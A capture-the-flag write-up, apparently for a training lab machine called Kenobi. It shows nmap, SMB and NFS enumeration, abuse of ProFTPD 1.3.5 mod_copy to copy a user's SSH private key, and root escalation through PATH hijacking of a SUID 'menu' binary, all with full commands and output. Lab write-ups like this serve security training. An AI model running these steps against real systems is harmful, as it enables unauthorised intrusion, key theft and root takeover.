### Kenobi

| Linux machine

#### NMAP

```
nmap -sC -sV -Pn -oN nmap/initial $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-13 00:05 IST
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 18.35% done; ETC: 00:05 (0:00:00 remaining)
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 41.30% done; ETC: 00:06 (0:00:03 remaining)
Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 68.05% done; ETC: 00:06 (0:00:02 remaining)
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 75.05% done; ETC: 00:06 (0:00:02 remaining)
Nmap scan report for 10.10.20.209
Host is up (0.16s latency).
Not shown: 992 closed tcp ports (conn-refused)
PORT     STATE    SERVICE        VERSION
21/tcp   open     ftp            ProFTPD 1.3.5
22/tcp   open     ssh            OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open     http           Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-title: Site doesn't have a title (text/html).
111/tcp  open     rpcbind        2-4 (RPC #100000)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
139/tcp  open     netbios-ssn    Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open     netbios-ssn    Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
1107/tcp filtered isoipsigport-2
2049/tcp open     nfs            2-4 (RPC #100003)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-04-12T18:36:20
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2024-04-12T13:36:20-05:00
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: -1s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.74 seconds
```

#### Apache Web server @ port 80

![Website](/home/edith/pwn/vuln_machines/kenobi/001.png)

![robots.txt](/home/edith/pwn/vuln_machines/kenobi/002.png)

![trap](/home/edith/pwn/vuln_machines/kenobi/003.png)

| **Feroxbuster**

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/kenobi]
└─$ feroxbuster -u http://10.10.20.209/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --depth=2 -C 400                                     

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.20.209/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 💢  Status Code Filters   │ [400]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 2
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       18l       21w      200c http://10.10.20.209/admin.html
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      866l     4178w   386659c http://10.10.20.209/image.jpg
200      GET       18l       21w      200c http://10.10.20.209/
[##############>-----] - 5m     62055/87652   0s      found:3       errors:684    
[##############>-----] - 5m     62045/87650   206/s   http://10.10.20.209/                                       
```

**Running feroxbutser resultant is nothing new (Seems like rabbit hole)**

#### Nmap SMB script scan

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/kenobi]
└─$ nmap --script=smb* $ip -oN nmap/smbscript
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-13 00:12 IST
Stats: 0:02:51 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 90.91% done; ETC: 00:15 (0:00:16 remaining)
Stats: 0:04:34 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 90.91% done; ETC: 00:17 (0:00:26 remaining)
Nmap scan report for 10.10.20.209
Host is up (0.16s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs

Host script results:
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          
|_smb-vuln-ms10-054: false
|_smb-flood: ERROR: Script execution failed (use -d to debug)
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.20.209\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.20.209\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.20.209\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
|_smb-vuln-ms10-061: false
| smb-brute: 
|_  No accounts found
| smb2-capabilities: 
|   2:0:2: 
|     Distributed File System
|   2:1:0: 
|     Distributed File System
|     Multi-credit operations
|   3:0:0: 
|     Distributed File System
|     Multi-credit operations
|   3:0:2: 
|     Distributed File System
|     Multi-credit operations
|   3:1:1: 
|     Distributed File System
|_    Multi-credit operations
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2:0:2
|     2:1:0
|     3:0:0
|     3:0:2
|_    3:1:1
| smb-mbenum: 
|   DFS Root
|     KENOBI  0.0  kenobi server (Samba, Ubuntu)
|   Master Browser
|     KENOBI  0.0  kenobi server (Samba, Ubuntu)
|   Print server
|     KENOBI  0.0  kenobi server (Samba, Ubuntu)
|   Server
|     KENOBI  0.0  kenobi server (Samba, Ubuntu)
|   Server service
|     KENOBI  0.0  kenobi server (Samba, Ubuntu)
|   Unix server
|     KENOBI  0.0  kenobi server (Samba, Ubuntu)
|   Windows NT/2000/XP/2003 server
|     KENOBI  0.0  kenobi server (Samba, Ubuntu)
|   Workstation
|_    KENOBI  0.0  kenobi server (Samba, Ubuntu)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2024-04-12T13:47:43-05:00
| smb2-time: 
|   date: 2024-04-12T18:42:41
|_  start_date: N/A
| smb-enum-domains: 
|   Builtin
|     Groups: n/a
|     Users: n/a
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|     Account lockout disabled
|   KENOBI
|     Groups: n/a
|     Users: n/a
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|_    Account lockout disabled
| smb-enum-sessions: 
|_  <nobody>
|_smb-print-text: false
|_smb-system-info: ERROR: Script execution failed (use -d to debug)
| smb-ls: Volume \\10.10.20.209\anonymous
| SIZE   TIME                 FILENAME
| <DIR>  2019-09-04T10:49:09  .
| <DIR>  2019-09-04T10:56:07  ..
| 12237  2019-09-04T10:48:17  log.txt
|_
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 389.06 seconds
```

| Enumerating shares

**we found _anonymous shares_** - Try to access it..

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/kenobi]
└─$ smbclient //$ip/anonymous
Password for [WORKGROUP\edith]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 16:19:09 2019
  ..                                  D        0  Wed Sep  4 16:26:07 2019
  log.txt                             N    12237  Wed Sep  4 16:19:09 2019

                9204224 blocks of size 1024. 6870568 blocks available
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (20.8 KiloBytes/sec) (average 20.8 KiloBytes/sec)
smb: \> ls
  .                                   D        0  Wed Sep  4 16:19:09 2019
  ..                                  D        0  Wed Sep  4 16:26:07 2019
  log.txt                             N    12237  Wed Sep  4 16:19:09 2019

                9204224 blocks of size 1024. 6870568 blocks available
```

### * <u>Important discovery</u>*

| By checking in _log.txt_ file ==>  We found that user **Kenobi ssh private key saved in _/home/kenobi/.ssh/id_rsa._**

#### Nmap NFS script scan

We found port 111 (rpcbind) and 2049 (nfs) service running by nmap scan, enumerate that..

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/kenobi]
└─$ nmap -p 111 --script=nfs* $ip -oN nmap/nfsscan                                                                    

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-13 00:51 IST
Nmap scan report for 10.10.20.209
Host is up (0.15s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *

Nmap done: 1 IP address (1 host up) scanned in 2.62 seconds
```

#### Try to mount the share

| Showmount

```
┌──(edith🛸HackBox)-[/mnt]
└─$ showmount -e 10.10.20.209
Export list for 10.10.20.209:
/var *
```

**Then mount the /var by creating temp mount directory (mkdir /mnt/tmp)**

```
┌──(edith🛸HackBox)-[/mnt]
└─$ sudo mount -t nfs 10.10.20.209:/var /mnt/tmp

┌──(edith🛸HackBox)-[/mnt]
└─$ cd /mnt/tmp/

┌──(edith🛸HackBox)-[/mnt/tmp]
└─$ ls
backups  cache  crash  lib  local  lock  log  mail  opt  run  snap  spool  tmp  www

┌──(edith🛸HackBox)-[/mnt/tmp]
└─$ ls -al
total 56
drwxr-xr-x 14 root root  4096 Sep  4  2019 .
drwxr-xr-x  3 root root  4096 Apr 13 01:52 ..
drwxr-xr-x  2 root root  4096 Sep  4  2019 backups
drwxr-xr-x  9 root root  4096 Sep  4  2019 cache
drwxrwxrwt  2 root root  4096 Sep  4  2019 crash
drwxr-xr-x 40 root root  4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff 4096 Apr 13  2016 local
lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root _ssh  4096 Sep  4  2019 log
drwxrwsr-x  2 root mail  4096 Feb 27  2019 mail
drwxr-xr-x  2 root root  4096 Feb 27  2019 opt
lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root root  4096 Jan 30  2019 snap
drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
drwxrwxrwt  6 root root  4096 Apr 12 23:39 tmp
drwxr-xr-x  3 root root  4096 Sep  4  2019 www
```

**Nothing juicy found here**

#### ProFTPD 1.3.5

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/kenobi]
└─$ searchsploit -w ProFTPD 1.3.5
---------------------------------------------------------------------------------------------------------------- --------------------------------------------
 Exploit Title                                                                                                  |  URL
---------------------------------------------------------------------------------------------------------------- --------------------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                       | https://www.exploit-db.com/exploits/37262
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                             | https://www.exploit-db.com/exploits/36803
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                         | https://www.exploit-db.com/exploits/49908
ProFTPd 1.3.5 - File Copy                                                                                       | https://www.exploit-db.com/exploits/36742
---------------------------------------------------------------------------------------------------------------- --------------------------------------------
Shellcodes: No Results
```

| We can use ProFTPd 1.3.5 - File Copy exploit here

`
The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.`

![Reference Link](https://www.exploit-db.com/exploits/36742)

### Initial access

By checking in _log.txt_ file ==>  We found that user **Kenobi ssh private key saved in _/home/kenobi/.ssh/id_rsa._**

| **Leverage any unauthenticated client to copy any file vulnerability in this proftpd version to copy the user's id_rsa key to /var/temp (mount we have access to)** 

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/kenobi]
└─$ nc $ip 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.20.209]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
^Z
[2]+  Stopped                 nc $ip 21
```

| Traverse the moubnt directory to access the copied file (id_rsa)

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/kenobi]
└─$ cd /mnt/tmp

┌──(edith🛸HackBox)-[/mnt/tmp]
└─$ ls                                                                                                                                                       
backups  cache  crash  lib  local  lock  log  mail  opt  run  snap  spool  tmp  www

┌──(edith🛸HackBox)-[/mnt/tmp]
└─$ cd tmp                                                                                                                                                   

┌──(edith🛸HackBox)-[/mnt/tmp/tmp]
└─$ ls                                                                                                                                                       
id_rsa
systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM
systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw
systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn
systemd-private-eb8df698b6e1454da735907eaa469187-systemd-timesyncd.service-42EG9k

┌──(edith🛸HackBox)-[/mnt/tmp/tmp]
└─$ cp id_rsa ~/pwn/vuln_machines/kenobi/id_rsa
```

| Finnaly, we logged in to kenobi account using his private key

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/kenobi]
└─$ chmod 600 id_rsa                                                                                                                                         

┌──(edith🛸HackBox)-[~/pwn/vuln_machines/kenobi]
└─$ ls -al                                                                                                                                                   
total 2272
drwxr-xr-x 3 edith edith    4096 Apr 13 02:13 .
drwxr-xr-x 5 edith edith    4096 Apr 12 23:42 ..
-rw-r--r-- 1 edith edith   12237 Apr 13 00:27 .txt
-rw-r--r-- 1 edith edith 1290419 Apr 13 00:59 001.png
-rw-r--r-- 1 edith edith   22375 Apr 13 01:00 002.png
-rw-r--r-- 1 edith edith  944922 Apr 13 00:59 003.png
-rw------- 1 edith edith    1675 Apr 13 02:13 id_rsa
-rwxr-xr-x 1 edith edith   12237 Apr 13 00:46 log.txt
drwxr-xr-x 2 edith edith    4096 Apr 13 00:51 nmap
-rw-r--r-- 1 edith edith   16611 Apr 13 02:14 readme.md

┌──(edith🛸HackBox)-[~/pwn/vuln_machines/kenobi]
└─$ ssh -i id_rsa kenobi@$ip                                                                                                                                 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```

#### Privelege escalation

| checking for suid bit set binary

Found uncommon one ==> /usr/bin/menu

```
kenobi@kenobi:~$ find / -perm -4000 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Fri, 12 Apr 2024 20:52:50 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html
```

| Get strings on the binary

```
kenobi@kenobi:~$ strings /usr/bin/menu
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
__stack_chk_fail
printf
system
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-`
AWAVA
AUATL
[]A\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice
;*3$"
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
```

| Here the binaries are running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname OR /usr/bin/ifconfig)

**We abuse that by modifying the path variable**

**_Method 1 : Given in tryhackme_**

- By copying the bin/sh as ifconfig
- Then giving executable persmission
- change the path environment variable 
- Run /usr/bin/menu & option 3 (which runs ifconfig here)

```
kenobi@kenobi:~$ cp /bin/sh ifconfig 
kenobi@kenobi:~$ chmod +x ifconfig 
kenobi@kenobi:~$ ls -l
total 164
-rwxrwxrwx 1 kenobi kenobi 154072 Apr 12 16:34 ifconfig
drwxr-xr-x 2 kenobi kenobi   4096 Sep  4  2019 share
drwxrwxr-x 2 kenobi kenobi   4096 Apr 12 16:26 try
-rw-rw-r-- 1 kenobi kenobi     33 Sep  4  2019 user.txt
kenobi@kenobi:~$ export PATH=~/:$PATH
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# 
```

Here we need to stablise it for autocomplete  

**_Method 2 : John hammond method_**

- By writting bash script (/bin/bash -c 'chmod +s /bin/bash') named ifconfig that sets SUID bit to /bin/bash file 
- Then giving executable persmission
- change the path environment variable 
- Run /usr/bin/menu & option 3 (which runs ifconfig here)

```
kenobi@kenobi:~/try$ echo "/bin/bash -c 'chmod +s /bin/bash'" > ifconfig
kenobi@kenobi:~/try$ chmod +x ifconfig 
kenobi@kenobi:~/try$ export PATH=~/try:$PATH
kenobi@kenobi:~/try$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
kenobi@kenobi:~/try$ /bin/bash -p
bash-4.3# id
uid=1000(kenobi) gid=1000(kenobi) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare),1000(ke
```

-----------------------------------------------------------------------------------------------------------------------------